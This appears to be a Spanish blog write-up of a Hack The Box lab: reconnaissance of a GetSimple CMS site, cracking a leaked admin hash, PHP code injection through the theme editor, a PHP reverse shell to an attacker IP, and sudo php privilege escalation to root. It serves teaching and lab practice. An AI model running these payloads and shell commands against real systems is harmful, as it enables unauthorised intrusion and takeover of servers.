--- 
title: "Comprobación de Conocimentos"  
date: 2025-04-07  
tags: ["HTB", "Pentesting","Web"]  
categories: ["Pentesting","Web"]  
summary: "Este es un reto muy bueno para empezar la parte de pentesting, vamos a tocar una pagina web y las distintas fases que debemos dominar."  
draft: false 

---

**Objetivos:** El primer objetivo de este reto es una vez comprometido el servidor pongamos el contenido de la flag del archivo user.txt.
Mientras que el segundo objetivo es poner el contenido de la flag del archivo root.txt una vez ya hallamos escalado privilegios.
![](../../../../../images/HTB_modulos/ipobjetivo.png)
![](../../../../../images/HTB_modulos/Objetivo2.png)

Antes de empezar revisamos un poco lo que nos dice la propia platafoma para que tengamos una guía del orden en que debemos trabajar.
![](../../../../../images/HTB_modulos/Inicio.png)

Empezamos con **Reconocimiento**:
Hacemos un escaneo inicial con **nmap**.
```bash 
nmap -p- -n -Pn --open -sS --min-rate 1000 {Ip}
```
![](../../../../../images/HTB_modulos/nmap1.png)
**Párametros**:
	-p- para que me escanee todos los puertos
	-n para que no haga resolución DNS
	-Pn No haga descubrimiento de hosts
	--open para que solo muestre los puertos abiertos
	-sS hacemos el escaneo SealthScan que es muy rápido y eficiente.
	--min-rate 1000 para que escanee mínimo 1000 paquetes por segundo.

Obtenemos 2 puertos abiertos (22 y 80)

Vamos a recopilar mas información:
```bash 
nmap -p22,80 -n -Pn -sCV {Ip}
```
![](../../../../../images/HTB_modulos/nmap2.png)
**Párametros**:
	-p22,80 para que me escanee solo estos 2 puertos
	-n para que no haga resolución DNS
	-Pn No haga descubrimiento de hosts
	-sCV hacemos el escaneo donde buscamos las versiones de los servicios que están corriendo en el servidor y los scripts que básicos que detecte que se puedan aplicar.

Obtenemos las versiones de ambos servicios, más el sistema operativo del servidor, de todas formas vamos a ir comprobando esta información.

Usamos **whatweb** para ir contrastando la información del puerto 80
```bash
whatweb http://{IP}:80
```
![](../../../../../images/HTB_modulos/whatweb.png)

También podemos contrastar con **curl:**
```bash
curl -I http://{IP}:80
```
![](../../../../../images/HTB_modulos/curl.png)

Vamos a echarle un vistazo a la página web:
![](../../../../../images/HTB_modulos/web1.png)

Y leemos que están usando un CMS llamado GetSimple. Podemos **investigar** un poco en google a ver de que se trata.

Podemos proceder a hacerle fuzzin a esta dirección a ver si encontramos rutas o archivos accesibles.
```bash
gobuster dir -u http://{IP} -w {/path/to/wordlist/}
```
![](../../../../../images/HTB_modulos/gobuster.png)
Con esto podemos ir trabajando vamos con data
![](../../../../../images/HTB_modulos/data.png)
Dentro de estas carpetas encontramos 
- http://{IP}/data/other/website.xml
	Que el sitio tiene por nombre http://gettingstarted.htb/ 
	Esto lo podemo añadir a nuestro /etc/hosts. 
- http://{IP}/data/other/authorization.xml
	Apikey -> <![CDATA[ 4f399dc72ff8e619e327800f851e9986 ]]>
- http://{IP}/data/other/plugins.xml
	Obtenemos 2 plugins
	anonymous_data.php
	InnovationPlugin.php
- http://{IP}/data/users/admin.xml
	Obtenemos un correo admin@gettingstarted.com
	Obtenemos el usuario admin
	Y obtenemos esto **PWD** d033e22ae348aeb5660fc2140aec35850c4da997 **PWD**
	Podemos intentar decodificar esta cadena, tiene pinta de ser un password.

![](../../../../../images/HTB_modulos/hash.png)
	Y vemos que efectivamente al crackearlo tenemos como resultado **admin**. 

Seguimos buscando y obtenemos un panel de autenticación 
 http://{IP}/admin/
![](../../../../../images/HTB_modulos/admin.png)
Probamos las credenciales que tenemos y para adentro!
![](../../../../../images/HTB_modulos/autenticado.png)

Recopilamos informacion en el sitio:
- GetSimple Version 3.3.15
- Vemos que podemos crear y editar páginas 
- Vemos que podemos editar temas y componentes
- Podemos también editar el sitemap
- ![](../../../../../images/HTB_modulos/wapp.png)
- Vemos que esta hecho con php
- Hay que tener en cuenta que tanto las páginas, temas y componentes son archivos php, con lo cual podemos intentar dar una instrucción a ver si el servidor nos la interpreta.
 ```php
<?php system('id'); ?> 
```
 ![](../../../../../images/HTB_modulos/component1.png)
 ![](../../../../../images/HTB_modulos/component2.png)
 
 Dado que el servidor nos interpreta la instrucción tenemos ejecución remota de comandos en el servidor. Con lo que debemos intentar lanzarnos una bash a nuestro equipo atacante para trabajar mejor.
 ```php
 <?php system('php -r \'$sock=fsockopen("10.10.15.64",4444);exec("/bin/sh -i <&3 >&3 2>&3");\''); ?>
```
 ![](../../../../../images/HTB_modulos/component3.png)
Nos ponemos en escucha con netcat:
```bash
nc -lvnp 4444
```
 ![](../../../../../images/HTB_modulos/rshell1.png)
Y hacemos la petición a http://{IP}
Y vemos que tenemos una terminal /bin/sh/
 ![](../../../../../images/HTB_modulos/rshell2.png)

Lo siguiente que debemos hacer es darle tratamiento a la tty para poder trabajar cómodos:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
 ![](../../../../../images/HTB_modulos/rshell3.png)

Nos podemos mover en el servidor para encontrar la primera flag
 ![](../../../../../images/HTB_modulos/flag1.png)

Vale el siguiente objetivo es escalar privilegios a root para obtener la segunda flag 
Ejecutamos el siguiente comando para ver que comandos podemos ejecutar como root sin necesidad de contraseña:
```bash
sudo -l
```
 ![](../../../../../images/HTB_modulos/escalada.png)
Y vemos que podemos ejecutar el comando php sin contraseña, lo siguiente que debemos hacer es buscar algún script con php que nos permita escalar privilegios.
Recomiendo este recurso que tiene muchas funciones para escalar privilegios que podemos probar:
![](../../../../../images/HTB_modulos/escalada2.png)Ponemos php y tocamos en sudo que es lo que tenemos ahora mismo posible ejecutar:
![](../../../../../images/HTB_modulos/escalada3.png)
Vale lo que vamos a hacer una pequeña modificación al comando para ejecutarlo de una:
```bash
sudo php -r "system('/bin/bash');"
```
![](../../../../../images/HTB_modulos/escalada4.png)
Entonces lo que vamos a hacer a continuación es buscar la flag de root.

```bash
cd /root
ls
cat root.txt
```
![](../../../../../images/HTB_modulos/escalada5.png)

Tenemos la 2da flag. 

Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir que podemos mejorar te lo voy a agradecer un montón.
